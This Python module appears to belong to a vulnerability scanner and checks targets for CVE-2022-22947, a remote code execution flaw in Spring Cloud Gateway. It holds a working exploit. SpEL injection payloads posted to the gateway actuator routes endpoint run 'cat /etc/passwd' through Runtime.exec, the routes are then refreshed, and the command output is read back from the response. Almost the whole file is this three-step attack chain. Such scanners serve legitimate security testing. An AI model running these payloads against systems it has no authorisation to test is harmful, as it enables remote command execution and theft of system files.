#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

randomName = random_md5()

cve_2022_22947_payloads = [
    {
        'path-1': 'gateway/routes/{RANDOMNAME}'.format(RANDOMNAME=randomName),
        'data-1': '''{"id": "RANDOMNAME","filters": [{"name": "AddResponseHeader","args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"}}],"uri": "http://example.com"}'''.replace('RANDOMNAME', randomName),
        'path-2': 'gateway/refresh',
        'path-3': 'gateway/routes/{RANDOMNAME}'.format(RANDOMNAME=randomName),
    },
    {
        'path-1': 'actuator/gateway/routes/{RANDOMNAME}'.format(RANDOMNAME=randomName),
        'data-1': '''{"id": "RANDOMNAME","filters": [{"name": "AddResponseHeader","args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"}}],"uri": "http://example.com"}'''.replace('RANDOMNAME', randomName),
        'path-2': 'actuator/gateway/refresh',
        'path-3': 'actuator/gateway/routes/{RANDOMNAME}'.format(RANDOMNAME=randomName),
    },
]

def cve_2022_22947_scan(self, clients):
    ''' 在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序
            在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击
            远程攻击者可以发出制作的恶意请求, 在远程主机上进行远程执行任意代码
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2022-22947',
    }
    
    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cve_2022_22947_payloads:
        path_1 = payload['path-1']
        data_2 = payload['data-1']
        
        path_2 = payload['path-2']
        path_3 = payload['path-3']

        # * 1/ 命令执行
        res1 = client.request(
            'post',
            path_1,
            data=data_2,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        # * 2/ 刷新路由
        res2 = client.request(
            'post',
            path_2,
            # headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        # * 3/ 查看回显
        res3 = client.request(
            'get',
            path_3,
            # headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res3 is None:
            continue

        if (check.check_res_fileread(res3.text)):
            results = {
                'Target': res3.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request-1': res1,
                'Request-2': res2,
                'Request-3': res3,
            }
            return results
    return None
